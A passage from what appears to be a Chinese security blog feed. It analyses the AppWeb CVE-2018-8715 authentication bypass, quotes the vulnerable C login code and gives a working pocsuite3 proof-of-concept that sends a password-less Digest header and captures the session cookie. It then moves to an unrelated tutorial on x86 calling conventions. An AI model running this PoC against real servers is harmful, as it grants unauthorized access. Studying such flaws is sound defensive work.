class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数负责调用两个用于认证处理的函数：<code>getCredentials</code>和<code>httpLogin</code>，注意到<code>httpGetCredentials</code>周围缺少检查，这将会在稍后起到作用</p><p><code>httpGetCredentials()</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Get the username and password credentials. If using an in-protocol auth scheme like basic|digest, the</span><br><span class="line">    rx-&gt;authDetails will contain the credentials and the parseAuth callback will be invoked to parse.</span><br><span class="line">    Otherwise, it is expected that &quot;username&quot; and &quot;password&quot; fields are present in the request parameters.</span><br><span class="line">    This is called by authCondition which thereafter calls httpLogin</span><br><span class="line"> *&#x2F;</span><br><span class="line">PUBLIC bool httpGetCredentials(HttpConn *conn, cchar **username, cchar **password)</span><br><span class="line">&#123;</span><br><span class="line">    HttpAuth    *auth;</span><br><span class="line"></span><br><span class="line">    assert(username);</span><br><span class="line">    assert(password);</span><br><span class="line">    *username &#x3D; *password &#x3D; NULL;</span><br><span class="line"></span><br><span class="line">    auth &#x3D; conn-&gt;rx-&gt;route-&gt;auth;</span><br><span class="line">    if (!auth || !auth-&gt;type) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (auth-&gt;type) &#123;</span><br><span class="line">        if (conn-&gt;authType &amp;&amp; !smatch(conn-&gt;authType, auth-&gt;type-&gt;name)) &#123;</span><br><span class="line">            if (!(smatch(auth-&gt;type-&gt;name, &quot;form&quot;) &amp;&amp; conn-&gt;rx-&gt;flags &amp; HTTP_POST)) &#123;</span><br><span class="line">                &#x2F;* If a posted form authentication, ignore any basic|digest details in request *&#x2F;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (auth-&gt;type-&gt;parseAuth &amp;&amp; (auth-&gt;type-&gt;parseAuth)(conn, username, password) &lt; 0) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        *username &#x3D; httpGetParam(conn, &quot;username&quot;, 0);</span><br><span class="line">        *password &#x3D; httpGetParam(conn, &quot;password&quot;, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数接收两个指向数组的指针用于从请求中解析<code>username</code>和<code>password</code>。既然<code>authCondition</code>没有进行参数检查，那么<code>parseAuth</code>失败也无关紧要。这意味着我们能够插入<code>WWW-Authenticate header</code>或者post任何我们想要的认证数据</p><p><code>httpLogin()</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Login the user and create an authenticated session state store</span><br><span class="line"> *&#x2F;</span><br><span class="line">PUBLIC bool httpLogin(HttpConn *conn, cchar *username, cchar *password)</span><br><span class="line">&#123;</span><br><span class="line">    HttpRx          *rx;</span><br><span class="line">    HttpAuth        *auth;</span><br><span class="line">    HttpSession     *session;</span><br><span class="line">    HttpVerifyUser  verifyUser;</span><br><span class="line"></span><br><span class="line">    rx &#x3D; conn-&gt;rx;</span><br><span class="line">    auth &#x3D; rx-&gt;route-&gt;auth;</span><br><span class="line">    if (!username || !*username) &#123;</span><br><span class="line">        httpTrace(conn, &quot;auth.login.error&quot;, &quot;error&quot;, &quot;msg:&#39;missing username&#39;&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!auth-&gt;store) &#123;</span><br><span class="line">        mprLog(&quot;error http auth&quot;, 0, &quot;No AuthStore defined&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ((verifyUser &#x3D; auth-&gt;verifyUser) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        if (!auth-&gt;parent || (verifyUser &#x3D; auth-&gt;parent-&gt;verifyUser) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            verifyUser &#x3D; auth-&gt;store-&gt;verifyUser;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!verifyUser) &#123;</span><br><span class="line">        mprLog(&quot;error http auth&quot;, 0, &quot;No user verification routine defined on route %s&quot;, rx-&gt;route-&gt;pattern);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (auth-&gt;username &amp;&amp; *auth-&gt;username) &#123;</span><br><span class="line">        &#x2F;* If using auto-login, replace the username *&#x2F;</span><br><span class="line">        username &#x3D; auth-&gt;username;</span><br><span class="line">        password &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(verifyUser)(conn, username, password)) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if (!(auth-&gt;flags &amp; HTTP_AUTH_NO_SESSION) &amp;&amp; !auth-&gt;store-&gt;noSession) &#123;</span><br><span class="line">        if ((session &#x3D; httpCreateSession(conn)) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            &#x2F;* Too many sessions *&#x2F;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        httpSetSessionVar(conn, HTTP_SESSION_USERNAME, username);</span><br><span class="line">        httpSetSessionVar(conn, HTTP_SESSION_IP, conn-&gt;ip);</span><br><span class="line">    &#125;</span><br><span class="line">    rx-&gt;authenticated &#x3D; 1;</span><br><span class="line">    rx-&gt;authenticateProbed &#x3D; 1;</span><br><span class="line">    conn-&gt;username &#x3D; sclone(username);</span><br><span class="line">    conn-&gt;encoded &#x3D; 0;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一函数会检查username是否为空，当存在session时，password指针可以为空，所以设置空密码指针，即使返回错误，也不会被authCondition检查，允许我们绕过身份验证</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222111637408.png" alt="image-20201222111637408"></p><p>用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p><h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from collections import OrderedDict</span><br><span class="line">from pocsuite3.api import Output, POCBase, OptString, register_poc, requests</span><br><span class="line"></span><br><span class="line">class AppWebPoc(POCBase):</span><br><span class="line">vulID &#x3D; &#39;003&#39;</span><br><span class="line">version &#x3D; &#39;1.0&#39;</span><br><span class="line">author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">vulDate &#x3D; &#39;2020-12-22&#39;</span><br><span class="line">updateDate &#x3D; &#39;2020-12-22&#39;</span><br><span class="line">references &#x3D; [&#39;https:&#x2F;&#x2F;ssd-disclosure.com&#x2F;ssd-advisory-appweb-authentication-bypass-digest-and-forms&#x2F;&#39;]</span><br><span class="line">name &#x3D; &#39;AppWeb CVE-2018-8715&#39;</span><br><span class="line">appPowerLink &#x3D; &#39;https:&#x2F;&#x2F;www.embedthis.com&#x2F;&#39;</span><br><span class="line">appName &#x3D; &#39;AppWeb&#39;</span><br><span class="line">appVersion &#x3D; &#39;&lt;7.0.3&#39;</span><br><span class="line">vulType &#x3D; &#39;Login Bypass&#39;</span><br><span class="line">desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> session</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">samples &#x3D; []</span><br><span class="line">install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def _options(self):</span><br><span class="line">o &#x3D; OrderedDict()</span><br><span class="line">o[&quot;username&quot;] &#x3D; OptString(&#39;&#39;, description&#x3D;&#39;这个poc需要用户登录，请输入登录账号&#39;, require&#x3D;True)</span><br><span class="line">return o</span><br><span class="line"></span><br><span class="line">def _verify(self):</span><br><span class="line">result &#x3D; &#123;&#125;</span><br><span class="line">payload &#x3D; self.get_option(&quot;username&quot;)</span><br><span class="line">#payload &#x3D; &quot;username&#x3D;&#123;0&#125;&quot;.format(self.get_option(&quot;username&quot;))</span><br><span class="line">url &#x3D; self.url</span><br><span class="line">headers&#x3D;&#123;</span><br><span class="line">&#39;Authorization&#39;:  &#39;Digest username&#x3D;&quot;&#39; +str(payload) +&#39;&quot;&#39;</span><br><span class="line">&#125;</span><br><span class="line"># proxies&#x3D;&#123;</span><br><span class="line"># &#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line"># &#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line"># &#125;</span><br><span class="line">r &#x3D; requests.get(url, headers&#x3D;headers)</span><br><span class="line">if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line">result[&#39;VerifyInfo&#39;][&#39;set-cookie&#39;] &#x3D; r.headers[&#39;set-cookie&#39;]</span><br><span class="line">return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line"> output &#x3D; Output(self)</span><br><span class="line"> if result:</span><br><span class="line"> output.success(result)</span><br><span class="line"> else:</span><br><span class="line"> output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> return output</span><br><span class="line"></span><br><span class="line">def _attack(self):</span><br><span class="line">return self._verify()</span><br><span class="line"></span><br><span class="line">register_poc(AppWebPoc)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201222135500449.png" alt="image-20201222135500449"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;摘要&quot;&gt;&lt;a href=&quot;#摘要&quot; class=&quot;headerlink&quot; title=&quot;摘要&quot;&gt;&lt;/a&gt;摘要&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web 
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="AppWeb" scheme="http://www.ol4three.com/tags/AppWeb/"/>
    
  </entry>
  
  <entry>
    <title>C语言函数调用栈(二)</title>
    <link href="http://www.ol4three.com/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88-%E4%BA%8C/"/>
    <id>http://www.ol4three.com/2020/12/18/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88-%E4%BA%8C/</id>
    <published>2020-12-17T16:08:32.000Z</published>
    <updated>2020-12-23T08:45:45.824Z</updated>
    
    <content type="html"><![CDATA[<h1 id="5-函数调用约定"><a href="#5-函数调用约定" class="headerlink" title="5 函数调用约定"></a>5 函数调用约定</h1><p>   创建一个栈帧的最重要步骤是主调函数如何向栈中传递函数参数。主调函数必须精确存储这些参数，以便被调函数能够访问到它们。函数通过选择特定的调用约定，来表明其希望以特定方式接收参数。此外，当被调函数完成任务后，调用约定规定先前入栈的参数由主调函数还是被调函数负责清除，以保证程序的栈顶指针完整性。</p><p>   函数调用约定通常规定如下几方面内容：</p><p>   1) 函数参数的传递顺序和方式</p><p>   最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。</p><p>   2) 栈的维护方式</p><p>   主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。</p><p>   3) 名字修饰(Name-mangling)策略</p><p>   又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。</p><p>   若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。</p><h2 id="5-1-常见调用约定"><a href="#5-1-常见调用约定" class="headerlink" title="5.1 常见调用约定"></a>5.1 常见调用约定</h2><p>   下面分别介绍常见的几种函数调用约定。</p><p>   <strong>1. cdecl**</strong>调用约定**</p><p>   又称C调用约定，是C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式。函数参数按照从右到左的顺序入栈，函数调用者负责清除栈中的参数，返回值在EAX中。由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且调用时即使实参和形参数目不符也不会导致堆栈错误。对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。 </p><blockquote><p>【扩展阅读】<strong>可变参数函数支持条件</strong></p><p>若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。</p><p>首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！</p><p>其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。</p><p>C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。</p></blockquote><p> <strong>2. stdcall**</strong>调用约定<strong><strong>(</strong></strong>微软命名<strong>**)</strong></p><p>   Pascal程序缺省调用方式，WinAPI也多采用该调用约定。stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中。stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如_functionname@number。</p><p><strong>3. fastcall**</strong>调用约定**</p><p>   stdcall调用约定的变形，通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。</p><p>   <strong>4. thiscall**</strong>调用约定**</p><p>   C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。</p><p>   thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。</p><p>   注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。</p><p>   <strong>5. naked call**</strong>调用约定**</p><p>   对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数：</p><p>   代码示例如下(Windows采用Intel汇编语法，注释符为;)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) int __stdcall function(int a, int b) &#123;</span><br><span class="line">  ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T)</span><br><span class="line">  __asm mov eax, a</span><br><span class="line">  __asm add eax, b</span><br><span class="line">  __asm ret 8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>6. pascal**</strong>调用约定**</p><p>   Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。</p><p>   Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。</p><p>   上述调用约定的主要特点如下表所示：</p><table><thead><tr><th><strong>调用方式</strong></th><th><strong>stdcall(Win32)</strong></th><th><strong>cdecl</strong></th><th><strong>fastcall</strong></th><th><strong>thiscall(C++)</strong></th><th><strong>naked call</strong></th></tr></thead><tbody><tr><td><strong>参数压栈顺序</strong></td><td>从右至左</td><td>从右至左</td><td>从右至左，Arg1在ecx，Arg2在edx</td><td>从右至左，this指针在ecx</td><td>自定义</td></tr><tr><td><strong>参数位置</strong></td><td>栈</td><td>栈</td><td>栈 + 寄存器</td><td>栈，寄存器ecx</td><td>自定义</td></tr><tr><td><strong>负责清栈的函数</strong></td><td>被调函数</td><td>主调函数</td><td>被调函数</td><td>被调函数</td><td>自定义</td></tr><tr><td><strong>支持可变参数</strong></td><td>否</td><td>是</td><td>否</td><td>否</td><td>自定义</td></tr><tr><td><strong>函数名字格式</strong></td><td>_name@number</td><td>_name</td><td>@name@number</td><td></td><td>自定义</td></tr><tr><td><strong>参数表开始标识</strong></td><td>“@@YG”</td><td>“@@YA”</td><td>“@@YI”</td><td></td><td>自定义</td></tr></tbody></table><p>注：C++因支撑函数重载、命名空间和成员函数等语法特征，采用更为复杂的名字修饰策略。</p><p>C++函数修饰名以”?”开始，后面紧跟函数名、参数表开始标识和按照类型代号拼出的返回值参数表。</p><p>例如，函数int Function(char *var1,unsigned long)对应的stdcall修饰名为”?Function@@YGHPADK@Z”。</p><p>  Windows下可直接在函数声明前添加关键字<strong>stdcall、</strong>cdecl或<strong>fastcall等标识确定函数的调用方式，如int __stdcall func()。Linux下可借用函数attribute 机制，如int __attribute</strong>((<strong>stdcall</strong>)) func()。</p><p>   代码示例如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __attribute__((__cdecl__)) CalleeFunc(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> k)&#123;</span><br><span class="line"><span class="comment">// int __attribute__((__stdcall__)) CalleeFunc(int i, int j, int k)&#123;</span></span><br><span class="line"><span class="comment">//int __attribute__((__fastcall__)) CalleeFunc(int i, int j, int k)&#123;</span></span><br><span class="line">    <span class="keyword">return</span> i+j+k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CallerFunc</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    CalleeFunc(<span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    CallerFunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 被调函数CalleeFunc分别声明为cdecl、stdcall和fastcall约定时，其汇编代码比较如下表所示：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201112152431087.png" alt="image-20201112151736782"></p><h2 id="5-2-调用约定影响"><a href="#5-2-调用约定影响" class="headerlink" title="5.2 调用约定影响"></a>5.2 调用约定影响</h2><p>   当函数导出被其他程序员所使用(如库函数)时，该函数应遵循主要的调用约定，以便于程序员使用。若函数仅供内部使用，则其调用约定可只被使用该函数的程序所了解。</p><p>   在多语言混合编程(包括A语言中使用B语言开发的第三方库)时，若函数的原型声明和函数体定义不一致或调用函数时声明了不同的函数约定，将可能导致严重问题(如堆栈被破坏)。</p><p>   以Delphi调用C函数为例。Delphi函数缺省采用stdcall调用约定，而C函数缺省采用cdecl调用约定。一般将C函数声明为stdcall约定，如：int __stdcall add(int a, int b);</p><p>   在Delphi中调用该函数时也应声明为stdcall约定：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function add(a: Integer; b: Integer): Integer; stdcall; &#x2F;&#x2F;参数类型应与DLL中的函数或过程参数类型一致，且引用时使用stdcall参数</span><br><span class="line">external &#39;a.dll&#39;; &#x2F;&#x2F;指定被调DLL文件的路径和名称</span><br></pre></td></tr></table></figure><p>不同编译器产生栈帧的方式不尽相同，主调函数不一定能正常完成清栈工作；而被调函数必然能自己完成正常清栈，因此，在跨(开发)平台调用中，通常使用stdcall调用约定(不少WinApi均采用该约定)。</p><p>   此外，主调函数和被调函数所在模块采用相同的调用约定，但分别使用C++和C语法编译时，会出现链接错误(报告被调函数未定义)。这是因为两种语言的函数名字修饰规则不同，解决方式是使用extern “C”告知主调函数所在模块：被调函数是C语言编译的。采用C语言编译的库应考虑到使用该库的程序可能是C++程序(使用C++编译器)，通常应这样声明头文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#ifdef _cplusplus</span><br><span class="line">    extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line">    type Func(type para);</span><br><span class="line">#ifdef _cplusplus</span><br><span class="line">    &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>   这样C++编译器就会按照C语言修饰策略链接Func函数名，而不会出现找不到函数的链接错误。</p><h2 id="5-3-x86函数参数传递方法"><a href="#5-3-x86函数参数传递方法" class="headerlink" title="5.3 x86函数参数传递方法"></a>5.3 x86函数参数传递方法</h2><p>   x86处理器ABI规范中规定，所有传递给被调函数的参数都通过堆栈来完成，其压栈顺序是以函数参数从右到左的顺序。当向被调函数传递参数时，所有参数最后形成一个数组。由于采用从右到左的压栈顺序，数组中参数的顺序(下标0<del>N-1)与函数参数声明顺序(Para1</del>N)一致。因此，在函数中若知道第一个参数地址和各参数占用字节数，就可通过访问数组的方式去访问每个参数。</p><h3 id="5-3-1-整型和指针参数的传递"><a href="#5-3-1-整型和指针参数的传递" class="headerlink" title="5.3.1 整型和指针参数的传递"></a>5.3.1 整型和指针参数的传递</h3><p>   整型参数与指针参数的传递方式相同，因为在32位x86处理器上整型与指针大小相同(均为四字节)。下表给出这两种类型的参数在栈帧中的位置关系。注意，该表基于tail函数的栈帧。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201112152431087.png" alt="image-20201112152424068"></p><h3 id="5-3-2-浮点参数的传递"><a href="#5-3-2-浮点参数的传递" class="headerlink" title="5.3.2 浮点参数的传递"></a>5.3.2 浮点参数的传递</h3><p>   浮点参数的传递与整型类似，区别在于参数大小。x86处理器中浮点类型占8个字节，因此在栈中也需要占用8个字节。下表给出浮点参数在栈帧中的位置关系。图中，调用tail函数的第一个和第三个参数均为浮点类型，因此需各占用8个字节，三个参数共占用20个字节。表中word类型的大小是4字节。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201112152431087.png" alt="image-20201112152431087"></p><h3 id="5-3-3-结构体和联合体参数的传递"><a href="#5-3-3-结构体和联合体参数的传递" class="headerlink" title="5.3.3 结构体和联合体参数的传递"></a>5.3.3 结构体和联合体参数的传递</h3><p>   结构体和联合体参数的传递与整型、浮点参数类似，只是其占用字节大小视数据结构的定义不同而异。x86处理器上栈宽是4字节，故结构体在栈上所占用的字节数为4的倍数。编译器会对结构体进行适当的填充以使得结构体大小满足4字节对齐的要求。</p><p>   对于一些RISC处理器(如PowerPC)，其参数传递并不是全部通过栈来实现。PowerPC处理器寄存器中，R3～R10共8个寄存器用于传递整型或指针参数，F1～F8共8个寄存器用于传递浮点参数。当所需传递的参数少于8个时，不需要用到栈。结构体和long double参数的传递通过指针来完成，这与x86处理器完全不同。PowerPC的ABI规范中规定，结构体的传递采用指针方式，而不是像x86处理器那样将结构从一个函数栈帧中拷贝到另一个函数栈帧中，显然x86处理器的方式更低效。可见，PowerPC程序中，函数参数采用指向结构体的指针(而非结构体)并不能提高效率，不过通常这是良好的编程习惯。</p><p> 5.4 x86函数返回值传递方法</p><p>   函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时<strong>：</strong></p><p>   1) 若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在EAX寄存器中，调用方通过读取EAX获取返回值。</p><p>   2) 若返回值大于4字节而小于8字节(如long 